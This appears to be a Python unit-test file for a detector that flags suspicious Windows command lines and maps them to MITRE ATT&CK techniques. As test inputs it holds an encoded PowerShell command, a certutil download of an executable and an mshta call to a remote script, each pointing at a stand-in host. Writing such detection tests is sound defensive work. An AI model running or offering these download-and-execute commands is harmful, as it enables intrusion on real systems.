from src.detector import analyze_command


def test_normal_command():
    result = analyze_command("notepad.exe")

    assert result == []


def test_powershell_detection():
    result = analyze_command("powershell -enc SQBFAFgA")

    assert len(result) == 1
    assert result[0]["severity"] == "High"
    assert result[0]["mitre_technique"] == "T1059.001"


def test_certutil_detection():
    result = analyze_command(
        "certutil -urlcache -split -f http://example.com/a.exe"
    )

    assert len(result) == 1
    assert result[0]["mitre_technique"] == "T1105"


def test_mshta_detection():
    result = analyze_command(
        "mshta https://example.com/a.hta"
    )

    assert len(result) == 1
    assert result[0]["mitre_technique"] == "T1218.005"